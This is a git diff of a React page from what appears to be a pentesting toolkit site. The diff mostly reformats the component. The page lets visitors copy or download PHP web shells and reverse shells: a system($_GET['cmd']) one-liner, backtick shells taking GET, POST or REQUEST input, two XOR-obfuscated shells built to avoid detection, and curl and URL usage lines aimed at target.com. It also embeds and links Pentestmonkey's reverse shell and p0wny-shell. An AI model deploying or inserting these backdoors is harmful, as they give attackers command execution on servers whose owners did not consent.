@@ -1,48 +1,43 @@
-import React, { useState } from "react";
-import {
-	Input,
-	Button,
-	message,
-	Typography,
-	Row,
-	Col,
-	Divider,
-	Collapse,
-} from "antd";
+import React from 'react';
+import PersistedState from 'use-persisted-state';
+import { Input, Button, message, Typography, Row, Col, Divider, Collapse } from 'antd';
 import {
 	CopyOutlined,
 	WifiOutlined,
 	DownloadOutlined,
 	ArrowsAltOutlined,
-	createFromIconfontCN,
-} from "@ant-design/icons";
-import QueueAnim from "rc-queue-anim";
-import Clipboard from "react-clipboard.js";
+	createFromIconfontCN
+} from '@ant-design/icons';
+import QueueAnim from 'rc-queue-anim';
+import Clipboard from 'react-clipboard.js';
+import SyntaxHighlighter from 'react-syntax-highlighter';
+import { vs2015 } from 'react-syntax-highlighter/dist/esm/styles/hljs';
+import pretty from 'pretty';
 
 const { Title, Paragraph } = Typography;
 const { Panel } = Collapse;
 const IconFont = createFromIconfontCN({
-	scriptUrl: ["./iconfont.js"],
+	scriptUrl: [ './iconfont.js' ]
 });
 
 export default (props) => {
-	const [values, setValues] = useState({
-		ip: "",
-		port: "",
+	const useIPv4State = PersistedState('ipv4_tcp_cache');
+	const [ values, setValues ] = useIPv4State({
+		ip: '',
+		port: ''
 	});
 	const handleChange = (name) => (event) => {
 		setValues({ ...values, [name]: event.target.value });
 	};
 	const successInfoReverseShell = () => {
-		message.success("Your reverse shell has been copied");
+		message.success('Your reverse shell has been copied');
 	};
 	const oneLiner = `<?php system($_GET["cmd"]);?`;
 	const shell_obfuscate =
 		`<?=$_="";$_="'" \;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=` +
 		"${$_}['_'^'o'];echo`$_`?>";
 	const shell_obfuscate_function =
-		`<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?>` +
-		"<?=${'_'.$_}['_'](${'_'.$_}['__']);?>";
+		`<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?>` + "<?=${'_'.$_}['_'](${'_'.$_}['__']);?>";
 
 	const phpReverseShell = `
   <?php
@@ -195,16 +190,12 @@ export default (props) => {
   `;
 	return (
 		<QueueAnim delay={300} duration={1500}>
-			<Title
-				variant='Title level={3}'
-				style={{ fontWeight: "bold", margin: 15 }}
-			>
+			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
 				PHP Reverse Shell
 			</Title>
 			<Paragraph style={{ margin: 15 }}>
-				Attackers who successfully exploit a remote command execution
-				vulnerability can use a reverse shell to obtain an interactive shell
-				session on the target machine and continue their attack.
+				Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to
+				obtain an interactive shell session on the target machine and continue their attack.
 			</Paragraph>
 			<div style={{ padding: 15 }}>
 				<Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
@@ -213,17 +204,19 @@ export default (props) => {
 							maxLength={15}
 							prefix={<WifiOutlined />}
 							name='Ip adress'
-							placeholder='IP Address (ex: 212.212.111.222)'
-							onChange={handleChange("ip")}
+							placeholder='IP Address or domain (ex: 212.212.111.222)'
+							onChange={handleChange('ip')}
+							value={values.ip}
 						/>
 					</Col>
 					<Col span={12}>
 						<Input
-							maxLength={4}
+							maxLength={5}
 							prefix={<IconFont type='icon-Network-Plug' />}
 							name='Port'
 							placeholder='Port (ex: 1337)'
-							onChange={handleChange("port")}
+							onChange={handleChange('port')}
+							value={values.port}
 						/>
 					</Col>
 				</Row>
@@ -233,17 +226,16 @@ export default (props) => {
 				key='a'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
 				<Title>Pentestmonkey's reverse shell</Title>
-				<Paragraph>
-					This script will make an outbound TCP connection to a hardcoded IP and
-					port.
-				</Paragraph>
-				<Collapse defaultActiveKey={["0"]}>
+				<Paragraph>This script will make an outbound TCP connection to a hardcoded IP and port.</Paragraph>
+				<Collapse defaultActiveKey={[ '0' ]}>
 					<Panel header='View the souce code' key='1'>
-						<p>{phpReverseShell}</p>
+						<SyntaxHighlighter language='php' style={vs2015} showLineNumbers={true}>
+							{pretty(phpReverseShell)}
+						</SyntaxHighlighter>
 						<Button type='dashed' style={{ marginBottom: 10, marginTop: 15 }}>
 							<a
 								href='https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php'
@@ -251,7 +243,7 @@ export default (props) => {
 								target='_blank'
 								rel='noreferrer noopener'
 							>
-								<ArrowsAltOutlined />
+								<ArrowsAltOutlined style={{ marginRight: 10 }} />
 								See the github repo of the author
 							</a>
 						</Button>
@@ -261,12 +253,12 @@ export default (props) => {
 					type='primary'
 					style={{ marginBottom: 10, marginTop: 15 }}
 					onClick={() => {
-						const element = document.createElement("a");
-						const file = new Blob([phpReverseShell], {
-							type: "text/plain",
+						const element = document.createElement('a');
+						const file = new Blob([ phpReverseShell ], {
+							type: 'text/plain'
 						});
 						element.href = URL.createObjectURL(file);
-						element.download = "reverseShell.php";
+						element.download = 'reverseShell.php';
 						document.body.appendChild(element);
 						element.click();
 					}}
@@ -290,25 +282,25 @@ export default (props) => {
 				key='b'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
 				<Title>Basic RCE</Title>
 				<Paragraph>
-					When you have successfully uploaded your payload, just put your
-					commands after the variable ?cmd= (ex: ?cmd=ls -la")
+					When you have successfully uploaded your payload, just put your commands after the variable ?cmd=
+					(ex: ?cmd=ls -la")
 				</Paragraph>
 				<Paragraph copyable>{oneLiner}</Paragraph>
 				<Button
 					type='primary'
 					style={{ marginBottom: 10, marginTop: 15 }}
 					onClick={() => {
-						const element = document.createElement("a");
-						const file = new Blob([oneLiner], {
-							type: "text/plain",
+						const element = document.createElement('a');
+						const file = new Blob([ oneLiner ], {
+							type: 'text/plain'
 						});
 						element.href = URL.createObjectURL(file);
-						element.download = "basicRCE.php";
+						element.download = 'basicRCE.php';
 						document.body.appendChild(element);
 						element.click();
 					}}
@@ -332,21 +324,20 @@ export default (props) => {
 				key='c'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
 				<Title>Web shell</Title>
 				<Paragraph>
-					p0wny@shell:~# is a very basic, single-file, PHP shell. It can be used
-					to quickly execute commands on a server when pentesting a PHP
-					application.
+					p0wny@shell:~# is a very basic, single-file, PHP shell. It can be used to quickly execute commands
+					on a server when pentesting a PHP application.
 				</Paragraph>
-				<Collapse defaultActiveKey={["0"]}>
+				<Collapse defaultActiveKey={[ '0' ]}>
 					<Panel header='Watch the preview' key='1'>
 						<img
 							src='https://i.imgur.com/ALPFDj0.png'
 							alt='pownyShell'
-							style={{ height: "100%", width: "100%" }}
+							style={{ height: '100%', width: '100%' }}
 						/>
 					</Panel>
 				</Collapse>
@@ -359,15 +350,8 @@ export default (props) => {
 						<DownloadOutlined /> Download
 					</a>
 				</Button>
-				<Button
-					type='dashed'
-					style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-				>
-					<a
-						href='https://github.com/flozz/p0wny-shell'
-						target='_blank'
-						rel='noopener noreferrer'
-					>
+				<Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+					<a href='https://github.com/flozz/p0wny-shell' target='_blank' rel='noopener noreferrer'>
 						<ArrowsAltOutlined /> See the repo of the author
 					</a>
 				</Button>
@@ -377,35 +361,30 @@ export default (props) => {
 				key='d'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
-				<Title>Obfuscate PHP Web Shell</Title>
-				<Paragraph copyable>{"<?=`$_GET[0]`?>"}</Paragraph>
-				<Paragraph>
-					{" Usage : http://target.com/path/to/shell.php?0=command "}
-				</Paragraph>
+				<Title>Obfuscated PHP Web Shell</Title>
+				<Paragraph copyable>{'<?=`$_GET[0]`?>'}</Paragraph>
+				<Paragraph>{' Usage : http://target.com/path/to/shell.php?0=command '}</Paragraph>
 				<Button
 					type='primary'
 					style={{ marginBottom: 10, marginTop: 15 }}
 					onClick={() => {
-						const element = document.createElement("a");
-						const file = new Blob(["<?=`$_GET[0]`?>"], {
-							type: "text/plain",
+						const element = document.createElement('a');
+						const file = new Blob([ '<?=`$_GET[0]`?>' ], {
+							type: 'text/plain'
 						});
 						element.href = URL.createObjectURL(file);
-						element.download = "obfuscateShell.php";
+						element.download = 'obfuscateShell.php';
 						document.body.appendChild(element);
 						element.click();
 					}}
 				>
 					<DownloadOutlined /> Download
 				</Button>
-				<Clipboard component='a' data-clipboard-text={"<?=`$_GET[0]`?>"}>
-					<Button
-						type='dashed'
-						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-					>
+				<Clipboard component='a' data-clipboard-text={'<?=`$_GET[0]`?>'}>
+					<Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
 						<CopyOutlined /> Copy
 					</Button>
 				</Clipboard>
@@ -415,36 +394,29 @@ export default (props) => {
 				key='e'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
-				<Paragraph copyable>{"<?=`$_POST[0]`?>"}</Paragraph>
-				<Paragraph>
-					{
-						' Usage :   curl -X POST http://target.com/path/to/shell.php -d "0=command" '
-					}
-				</Paragraph>
+				<Paragraph copyable>{'<?=`$_POST[0]`?>'}</Paragraph>
+				<Paragraph>{' Usage :   curl -X POST http://target.com/path/to/shell.php -d "0=command" '}</Paragraph>
 				<Button
 					type='primary'
 					style={{ marginBottom: 10, marginTop: 15 }}
 					onClick={() => {
-						const element = document.createElement("a");
-						const file = new Blob(["<?=`$_POST[0]`?>"], {
-							type: "text/plain",
+						const element = document.createElement('a');
+						const file = new Blob([ '<?=`$_POST[0]`?>' ], {
+							type: 'text/plain'
 						});
 						element.href = URL.createObjectURL(file);
-						element.download = "obfuscateShell.php";
+						element.download = 'obfuscateShell.php';
 						document.body.appendChild(element);
 						element.click();
 					}}
 				>
 					<DownloadOutlined /> Download
 				</Button>
-				<Clipboard component='a' data-clipboard-text={"<?=`$_POST[0]`?>"}>
-					<Button
-						type='dashed'
-						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-					>
+				<Clipboard component='a' data-clipboard-text={'<?=`$_POST[0]`?>'}>
+					<Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
 						<CopyOutlined /> Copy
 					</Button>
 				</Clipboard>
@@ -454,39 +426,31 @@ export default (props) => {
 				key='f'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
 				<Paragraph copyable>{"<?=`{$_REQUEST['_']}`?>"}</Paragraph>
 				<Paragraph>Usage :</Paragraph>
 				<Paragraph>- http://target.com/path/to/shell.php?_=command</Paragraph>
-				<Paragraph>
-					- curl -X POST http://target.com/path/to/shell.php -d "_=command" '
-				</Paragraph>
+				<Paragraph>- curl -X POST http://target.com/path/to/shell.php -d "_=command" '</Paragraph>
 				<Button
 					type='primary'
 					style={{ marginBottom: 10, marginTop: 15 }}
 					onClick={() => {
-						const element = document.createElement("a");
-						const file = new Blob(["<?=`{$_REQUEST['_']}`?>"], {
-							type: "text/plain",
+						const element = document.createElement('a');
+						const file = new Blob([ "<?=`{$_REQUEST['_']}`?>" ], {
+							type: 'text/plain'
 						});
 						element.href = URL.createObjectURL(file);
-						element.download = "obfuscateShell.php";
+						element.download = 'obfuscateShell.php';
 						document.body.appendChild(element);
 						element.click();
 					}}
 				>
 					<DownloadOutlined /> Download
 				</Button>
-				<Clipboard
-					component='a'
-					data-clipboard-text={"<?=`{$_REQUEST['_']}`?>"}
-				>
-					<Button
-						type='dashed'
-						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-					>
+				<Clipboard component='a' data-clipboard-text={"<?=`{$_REQUEST['_']}`?>"}>
+					<Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
 						<CopyOutlined /> Copy
 					</Button>
 				</Clipboard>
@@ -496,7 +460,7 @@ export default (props) => {
 				key='f'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
 				<Paragraph copyable>{shell_obfuscate}</Paragraph>
@@ -506,12 +470,12 @@ export default (props) => {
 					type='primary'
 					style={{ marginBottom: 10, marginTop: 15 }}
 					onClick={() => {
-						const element = document.createElement("a");
-						const file = new Blob([shell_obfuscate], {
-							type: "text/plain",
+						const element = document.createElement('a');
+						const file = new Blob([ shell_obfuscate ], {
+							type: 'text/plain'
 						});
 						element.href = URL.createObjectURL(file);
-						element.download = "obfuscateShell.php";
+						element.download = 'obfuscateShell.php';
 						document.body.appendChild(element);
 						element.click();
 					}}
@@ -519,10 +483,7 @@ export default (props) => {
 					<DownloadOutlined /> Download
 				</Button>
 				<Clipboard component='a' data-clipboard-text={shell_obfuscate}>
-					<Button
-						type='dashed'
-						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-					>
+					<Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
 						<CopyOutlined /> Copy
 					</Button>
 				</Clipboard>
@@ -532,27 +493,23 @@ export default (props) => {
 				key='g'
 				style={{
 					padding: 15,
-					marginTop: 15,
+					marginTop: 15
 				}}
 			>
 				<Paragraph copyable>{shell_obfuscate_function}</Paragraph>
 				<Paragraph>Usage :</Paragraph>
-				<Paragraph>
-					- http://target.com/path/to/shell.php?_=function&__=argument
-				</Paragraph>
-				<Paragraph>
-					- http://target.com/path/to/shell.php?_=system&__=ls
-				</Paragraph>
+				<Paragraph>- http://target.com/path/to/shell.php?_=function&__=argument</Paragraph>
+				<Paragraph>- http://target.com/path/to/shell.php?_=system&__=ls</Paragraph>
 				<Button
 					type='primary'
 					style={{ marginBottom: 10, marginTop: 15 }}
 					onClick={() => {
-						const element = document.createElement("a");
-						const file = new Blob([shell_obfuscate_function], {
-							type: "text/plain",
+						const element = document.createElement('a');
+						const file = new Blob([ shell_obfuscate_function ], {
+							type: 'text/plain'
 						});
 						element.href = URL.createObjectURL(file);
-						element.download = "obfuscateShell.php";
+						element.download = 'obfuscateShell.php';
 						document.body.appendChild(element);
 						element.click();
 					}}
@@ -560,10 +517,7 @@ export default (props) => {
 					<DownloadOutlined /> Download
 				</Button>
 				<Clipboard component='a' data-clipboard-text={shell_obfuscate_function}>
-					<Button
-						type='dashed'
-						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-					>
+					<Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
 						<CopyOutlined /> Copy
 					</Button>
 				</Clipboard>
